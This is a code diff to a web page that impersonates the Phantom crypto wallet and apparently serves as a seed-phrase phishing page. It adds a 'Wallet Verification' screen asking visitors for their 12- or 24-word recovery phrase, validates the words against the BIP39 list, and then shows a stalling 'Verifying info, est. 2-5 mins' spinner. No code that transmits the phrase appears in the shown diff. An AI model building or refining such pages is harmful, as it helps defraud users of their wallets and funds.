@@ -13,13 +13,13 @@
         }
 
         body {
-            background-color: #e5e5f0;
+            background-color: #e5e4ef;
             color: #fff;
             height: 100vh;
             display: flex;
             flex-direction: column;
             justify-content: space-between;
-            padding: 20px 24px;
+            padding: 24px 32px;
             overflow: hidden;
         }
 
@@ -35,26 +35,28 @@
             display: flex;
             align-items: center;
             cursor: pointer;
+            width: 32px;
+            height: 32px;
         }
 
         .logo-container svg {
-            width: 24px;
-            height: 24px;
+            width: 32px;
+            height: 32px;
             fill: #000;
         }
 
         .help-link {
             color: #000;
             background: transparent;
-            border: 1px solid #b8b8c8;
+            border: 1px solid #d1d1e0;
             text-decoration: none;
             font-size: 13px;
             font-weight: 400;
             display: flex;
             align-items: center;
             gap: 6px;
-            padding: 4px 10px;
-            border-radius: 6px;
+            padding: 5px 10px;
+            border-radius: 8px;
         }
 
         .help-link:hover {
@@ -71,10 +73,10 @@
 
         .modal {
             background-color: #0c0c0e;
-            width: 440px;
+            width: 460px;
             border-radius: 20px;
             padding: 32px 24px 24px 24px;
-            box-shadow: 0 16px 32px rgba(0, 0, 0, 0.25);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -84,7 +86,7 @@
         /* Pagination Dots */
         .dots {
             display: flex;
-            gap: 6px;
+            gap: 5px;
             margin-bottom: 20px;
         }
 
@@ -110,10 +112,49 @@
 
         .modal-subtitle {
             font-size: 12px;
-            color: #71717a;
-            margin-bottom: 20px;
+            color: #8c8c9e;
+            margin-bottom: 24px;
             text-align: center;
             line-height: 1.4;
+        }
+
+        /* Screen States */
+        .screen-center {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            width: 100%;
+            padding: 10px 0;
+        }
+
+        .screen-center .modal-title {
+            margin-bottom: 12px;
+        }
+
+        .screen-center .modal-subtitle {
+            margin-bottom: 32px;
+            max-width: 320px;
+        }
+
+        /* Spinner Animation */
+        .spinner {
+            width: 36px;
+            height: 36px;
+            border: 3px solid #27272a;
+            border-top: 3px solid #a855f7;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .hidden {
+            display: none !important;
         }
 
         /* Inputs Grid */
@@ -122,7 +163,7 @@
             grid-template-columns: repeat(3, 1fr);
             gap: 6px;
             width: 100%;
-            max-height: 200px;
+            max-height: 220px;
             overflow-y: auto;
             padding-right: 2px;
             margin-bottom: 14px;
@@ -139,12 +180,14 @@
 
         .input-group {
             position: relative;
-            background-color: #18181b;
-            border: 1px solid #27272a;
+            background-color: #141417;
+            border: 1px solid #232329;
             border-radius: 8px;
-            padding: 4px 8px;
+            padding: 5px 8px;
+            height: 42px;
             display: flex;
             flex-direction: column;
+            justify-content: center;
             transition: border-color 0.2s;
         }
 
@@ -154,9 +197,10 @@
         }
 
         .input-group label {
-            font-size: 9px;
+            font-size: 10px;
             color: #71717a;
-            margin-bottom: 1px;
+            line-height: 1;
+            margin-bottom: 2px;
         }
 
         .input-group input {
@@ -166,6 +210,7 @@
             font-size: 12px;
             outline: none;
             width: 100%;
+            line-height: 1.2;
         }
 
         /* Error Label Text */
@@ -173,28 +218,29 @@
             color: #ef4444;
             font-size: 11px;
             width: 100%;
-            margin-bottom: 12px;
+            margin-bottom: 14px;
             display: none;
             text-align: center;
         }
 
-        /* Switch Phrase Type Toggle */
+        /* Switch Phrase Type Toggle with Smooth Fade Animation */
         .toggle-phrase {
-            color: #c084fc;
+            color: #8c8c9e;
             background: none;
             border: none;
             font-size: 12px;
             cursor: pointer;
             margin-bottom: 16px;
             font-weight: 500;
+            transition: color 0.25s ease;
         }
 
         .toggle-phrase:hover {
-            text-decoration: underline;
+            color: #c084fc;
         }
 
-        /* Import Button */
-        .import-btn {
+        /* Action Buttons */
+        .action-btn {
             width: 100%;
             background-color: #fff;
             color: #000;
@@ -207,7 +253,7 @@
             transition: opacity 0.2s;
         }
 
-        .import-btn:hover {
+        .action-btn:hover {
             opacity: 0.9;
         }
     </style>
@@ -220,7 +266,7 @@
             <svg viewBox="0 0 24 24"><path d="M12.01 0C5.38 0 0 5.38 0 12c0 6.63 5.38 12 12.01 12 6.62 0 11.99-5.37 11.99-12 0-6.62-5.37-12-11.99-12zm4.18 16.32c-.31.31-.81.31-1.12 0l-3.06-3.06-3.06 3.06c-.31.31-.81.31-1.12 0-.31-.31-.31-.81 0-1.12l3.06-3.06-3.06-3.06c-.31-.31-.31-.81 0-1.12.31-.31.81-.31 1.12 0l3.06 3.06 3.06-3.06c.31-.31.81-.31 1.12 0 .31.31.31.81 0 1.12l-3.06 3.06 3.06 3.06c.31.31.31.81 0 1.12z"/></svg>
         </a>
         <a href="https://phantom.com/help" target="_blank" class="help-link">
-            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
             Help
         </a>
     </header>
@@ -228,22 +274,49 @@
     <!-- Main Section -->
     <div class="main-wrapper">
         <div class="modal">
-            <div class="dots">
-                <div class="dot active"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
+            <!-- Initial Welcome Screen -->
+            <div class="screen-center" id="welcomeScreen">
+                <div class="dots">
+                    <div class="dot active"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                </div>
+                <div class="modal-title">Wallet Verification</div>
+                <div class="modal-subtitle">Begin wallet verification by adding your recovery phrase.</div>
+                <button type="button" class="action-btn" id="startBtn">Continue</button>
             </div>
 
-            <div class="modal-title">Recovery Phrase</div>
-            <div class="modal-subtitle" id="subtitle-text">Import an existing wallet with your 12 or 24-word recovery phrase.</div>
+            <!-- Recovery Phrase Input Screen (Initially Hidden) -->
+            <div id="phraseScreen" class="hidden" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
+                <div class="dots">
+                    <div class="dot active"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                </div>
 
-            <div class="inputs-container" id="inputsGrid"></div>
+                <div class="modal-title">Recovery Phrase</div>
+                <div class="modal-subtitle" id="subtitle-text">Import an existing wallet with your 12 or 24-word recovery phrase.</div>
 
-            <div class="error-message" id="errorMessage">Word 1 is incorrect or misspelled</div>
+                <div class="inputs-container" id="inputsGrid"></div>
 
-            <button type="button" class="toggle-phrase" id="toggleBtn">I have a 24-word recovery phrase</button>
+                <div class="error-message" id="errorMessage"></div>
 
-            <button type="button" class="import-btn" id="importBtn">Import Wallet</button>
+                <button type="button" class="toggle-phrase" id="toggleBtn">I have a 24-word recovery phrase</button>
+
+                <button type="button" class="action-btn" id="importBtn">Import Wallet</button>
+            </div>
+
+            <!-- Loading / Verification Screen (Initially Hidden) -->
+            <div class="screen-center hidden" id="loadingScreen">
+                <div class="dots">
+                    <div class="dot active"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                </div>
+                <div class="spinner"></div>
+                <div class="modal-title">Verifying Info</div>
+                <div class="modal-subtitle">Verifying info, est. 2-5 mins</div>
+            </div>
         </div>
     </div>
 
@@ -254,11 +327,21 @@
         ];
 
         let wordCount = 12;
+        const welcomeScreen = document.getElementById('welcomeScreen');
+        const phraseScreen = document.getElementById('phraseScreen');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const startBtn = document.getElementById('startBtn');
         const inputsGrid = document.getElementById('inputsGrid');
         const toggleBtn = document.getElementById('toggleBtn');
         const subtitleText = document.getElementById('subtitle-text');
         const errorMessage = document.getElementById('errorMessage');
         const importBtn = document.getElementById('importBtn');
+
+        startBtn.onclick = function() {
+            welcomeScreen.classList.add('hidden');
+            phraseScreen.classList.remove('hidden');
+            renderInputs();
+        };
 
         function renderInputs() {
             inputsGrid.innerHTML = '';
@@ -289,8 +372,7 @@
         };
 
         importBtn.onclick = function() {
-            let hasError = false;
-            let firstErrorIndex = null;
+            let errorIndices = [];
 
             for (let i = 1; i <= wordCount; i++) {
                 const inputVal = document.getElementById(`word-${i}`).value.trim().toLowerCase();
@@ -298,21 +380,26 @@
 
                 if (inputVal === "" || !bip39Words.includes(inputVal)) {
                     groupDiv.classList.add('error');
-                    if (!hasError) {
-                        firstErrorIndex = i;
-                    }
-                    hasError = true;
+                    errorIndices.push(i);
                 } else {
                     groupDiv.classList.remove('error');
                 }
             }
 
-            if (hasError) {
-                errorMessage.textContent = `Word ${firstErrorIndex} is incorrect or misspelled`;
+            if (errorIndices.length > 0) {
+                let text = "";
+                if (errorIndices.length === 1) {
+                    text = `Word ${errorIndices[0]} is incorrect or misspelled`;
+                } else {
+                    const last = errorIndices.pop();
+                    text = `Words ${errorIndices.join(', ')} and ${last} are incorrect or misspelled`;
+                }
+                errorMessage.textContent = text;
                 errorMessage.style.display = 'block';
             } else {
                 errorMessage.style.display = 'none';
-                alert("Wallet successfully imported!");
+                phraseScreen.classList.add('hidden');
+                loadingScreen.classList.remove('hidden');
             }
         };
 
@@ -323,8 +410,6 @@
                 errorMessage.style.display = 'none';
             }
         });
-
-        renderInputs();
     </script>
 </body>
 </html>
